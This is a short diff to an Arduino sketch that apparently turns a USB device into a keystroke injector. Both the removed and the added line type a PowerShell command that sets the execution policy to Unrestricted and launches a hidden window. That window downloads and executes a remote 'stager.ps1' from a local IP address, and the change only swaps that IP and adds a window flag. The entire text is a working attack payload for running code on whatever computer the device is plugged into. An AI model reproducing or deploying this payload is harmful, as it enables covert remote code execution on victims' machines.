@@ -23,7 +23,7 @@ void setup()
   delay(100);
   typeKey(KEY_RETURN);
   delay(150);
-  Keyboard.print("powershell.exe Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.23/stager.ps1')\"");
+  Keyboard.print("powershell.exe -w 1 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.1.101/stager.ps1')\"");
   delay(150);
   typeKey(KEY_RETURN);
   Keyboard.end();
